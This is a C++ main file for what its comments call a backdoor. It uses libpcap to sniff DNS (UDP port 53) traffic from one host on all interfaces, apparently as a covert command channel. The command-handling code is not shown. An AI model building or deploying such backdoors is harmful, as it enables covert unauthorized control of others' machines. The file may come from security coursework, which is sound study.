#include <iostream>
#include <cstring>
#include <pcap.h>
#include <signal.h>
#include <dnet.h>
#include "Logger.h"
#include "NetworkMonitor.h"

using namespace std;


//Interface Structures For Listening
pcap_if_t * allInterfaces = nullptr;
pcap_if_t * listeningInterface = nullptr;

//Processing Structures For Backdoor Communication
bool keepListening = true;
NetworkMonitor * monitor = nullptr;

/**
 * shutdownServer is an event handler for Ctrl+C and shutdown requesting events. This method is called
 * in code and is registered to be triggered whenever Ctrl+C is called on the program. This ensures all
 * components of the backdoor have stopped before full termination occurs
 * @param signo
 */
void shutdownServer(int signo){
    Logger::println("Terminating Program");

    keepListening = false;
    monitor->killListening();

}


/**
 * getInterface is a helper method that finds all interfaces on the host machine. libpcap offers an 'any' interface
 * which allows the backdoor to listen to any traffic that comes into the machine it is running on. getInterface
 * fetches all interfaces and the searches specificaly for that interface.
 * @return Boolean - status as to whether it successfuly found the any interface
 */
bool getInterface(){

    Logger::setDebug(true);
    Logger::debug("Main:getInterfaces - Initializing");

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_if_t * interfaces;
    pcap_if_t * interface;

    Logger::debug("Main:getInterfaces - Finding All Interfaces");

    if(pcap_findalldevs(&interfaces, errbuf) == -1){
        Logger::error("Main:getInterfaces - There Was An Error Fetching The Interfaces");
        cerr << errbuf << endl;
        return false;
    }

    Logger::debug("Main:getInterfaces - Looping Through All Interfaces") ;

    allInterfaces = interfaces;
    interface = interfaces;
    while(interface != NULL){
        const char * name = interface->name;

        Logger::debug("Main:getInterfaces - Testing Interface With Name: " + string(name));

        if(strcmp(name, string("any").c_str()) == 0){
            //this is the any interface
            Logger::debug("Main:getInterfaces - FOUND THE ANY INTERFACE");

            listeningInterface = interface;
            return true;
        }

        interface = interface->next;
    }

    return false;
}


int main() {

    //register listening for kill commands.
    struct sigaction act;
    act.sa_handler = shutdownServer;
    act.sa_flags = 0;
    if(sigemptyset(&act.sa_mask) == -1 || sigaction(SIGINT, &act, NULL) == -1){
        perror("Failed to Set SIGNINT Handler");
        return 1;
    }

    Logger::debug("Registering Signal");

    //find listening items
    if(getInterface() == false){
        Logger::error("Main - There was An Error Reading The Interfaces");
        return 1;
    }else{
        Logger::debug("Finding Interface Successful");
    }

    Logger::debug("Fount Interfaces. Now Setting Up NetworkMonitor");

    monitor = NetworkMonitor::getInstance();
    monitor->setFilter("udp dst port 53 and ip src 192.168.0.100");

    Logger::debug("Filter Set. Now Listening");

    while(keepListening){

        //this will return a structure containing the received information
        monitor->listenForTraffic(listeningInterface);

        if(keepListening == false){
            break;
        }

        //anything else needing to be done ?

    }

    Logger::debug("Loop Killed. Terminating");

    Logger::debug("Freeing All ResourceS");
    pcap_freealldevs(allInterfaces);
    allInterfaces = nullptr;
    listeningInterface = nullptr;

    delete(monitor);

    monitor = nullptr;

    return 0;
}